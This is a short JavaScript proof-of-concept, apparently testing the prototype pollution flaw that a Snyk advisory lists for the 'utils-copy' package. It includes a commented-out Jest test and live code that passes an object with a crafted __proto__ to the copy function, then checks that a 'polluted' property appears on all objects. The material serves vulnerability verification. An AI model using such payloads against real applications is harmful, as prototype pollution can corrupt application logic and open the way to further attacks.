//https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
// test("prototype pollution in @fabiocaccamo/utils.js", () => {
//   const cp = require("utils-copy");
//   let targetObj = {};

//   expect({}.polluted).toBe(undefined);

//   cp({ a: targetObj, b: (__proto__.constructor.prototype.polluted = "yes") });
//   //sleep.sleep(3);
//   console.log({}.polluted);
//   expect(targetObj.polluted).toBe("yes");
// });

// const cp = require('utils-copy');
// let targetObj = {}
// __proto__.constructor.prototype.polluted = "yes"
// //cp({a: targetObj, b:  });
// //sleep.sleep(3);
// console.log({}.polluted)

var cp = require("utils-copy");
const targetObj = { __proto__: { polluted: "abd" } };
console.log("Before:" + {}.polluted);

cp(targetObj);

console.log("After:" + {}.polluted);
const newTargetObj = {};
console.log(newTargetObj.polluted);
